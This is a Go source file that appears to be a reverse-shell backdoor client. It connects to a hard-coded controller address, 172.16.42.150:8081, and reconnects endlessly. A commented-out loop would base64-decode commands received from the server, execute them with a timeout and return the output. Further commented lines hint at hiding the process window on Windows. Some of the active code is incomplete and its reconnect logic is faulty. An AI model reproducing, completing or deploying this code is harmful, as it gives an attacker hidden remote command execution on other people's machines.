package main

import (
	"bytes"
	"context"
	"fmt"
	"log"
	"net"
	"os/exec"
	"time"

	"github.com/axgle/mahonia"
)

const (
	IP = "172.16.42.150:8081"
)

var (
	// cmd执行超时的秒数
	Timeout = 30 * time.Second
	// cmd 输出字符串编码
	charset = "utf-8"
)

func main() {
	log.SetFlags(log.Ldate | log.Ltime | log.Lshortfile)
	//开始连接
	for {
		connect()
	}
}

// 转化字符串
func ConvertToString(src string, srcCode string, tagCode string) string {
	srcCoder := mahonia.NewDecoder(srcCode)
	srcResult := srcCoder.ConvertString(src)
	tagCoder := mahonia.NewDecoder(tagCode)
	_, cdata, _ := tagCoder.Translate([]byte(srcResult), true)
	result := string(cdata)
	return result
}

// 连接远程服务器
func connect() {
	//log.Println(IP)
	conn, err := net.Dial("tcp", IP)
	if err != nil {
		//fmt.Println("Connection...")
		for {
			connect()
		}
	}
	fmt.Println("Connection success...")
	buf := make([]byte, 4096)
	for {
		//等待接收指令，以 \n 为结束符，所有指令字符都经过base64
		// message := bufio.NewReader(conn)

		n, _ := conn.Read(buf)
		log.Println(n)
		// messagex := "xaaaaaaaa"
		// if err == io.EOF {
		// 	// 如果服务器断开，则重新连接
		// 	conn.Close()
		// 	connect()
		// }
		// log.Println("xxxxxxxxxx")
		// // 收到指令base64解码
		// decodedCase, _ := base64.StdEncoding.DecodeString(messagex)
		// command := string(decodedCase)
		// log.Println(command)
		// cmdParameter := strings.Split(command, " ")
		// log.Println(cmdParameter)
		// switch cmdParameter[0] {
		// default:
		// 	cmdArray := strings.Split(command, " ")
		// 	cmdSlice := cmdArray[1:len(cmdArray)]
		// 	out, outerr := mCommandTimeOut(cmdArray[0], cmdSlice...)
		// 	if outerr != nil {
		// 		out = []byte(outerr.Error())
		// 	}
		// 	// 解决命令行输出编码问题
		// 	if charset != "utf-8" {
		// 		out = []byte(ConvertToString(string(out), charset, "utf-8"))
		// 	}
		// 	encoded := base64.StdEncoding.EncodeToString(out)
		// 	conn.Write([]byte(encoded + "\n"))
		// }
	}
}

func mCommandTimeOut(name string, arg ...string) ([]byte, error) {
	ctxt, cancel := context.WithTimeout(context.Background(), Timeout)
	defer cancel()
	// 通过上下文执行，设置超时
	cmd := exec.CommandContext(ctxt, name, arg...)
	//cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	//cmd.SysProcAttr = &syscall.SysProcAttr{}

	var buf bytes.Buffer
	cmd.Stdout = &buf
	cmd.Stderr = &buf

	if err := cmd.Start(); err != nil {
		return buf.Bytes(), err
	}

	if err := cmd.Wait(); err != nil {
		return buf.Bytes(), err
	}

	return buf.Bytes(), nil
}

func mCommand(name string, arg ...string) {
	cmd := exec.Command(name, arg...)
	//cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	err := cmd.Start()
	if err != nil {
		fmt.Println(err)
	}
}
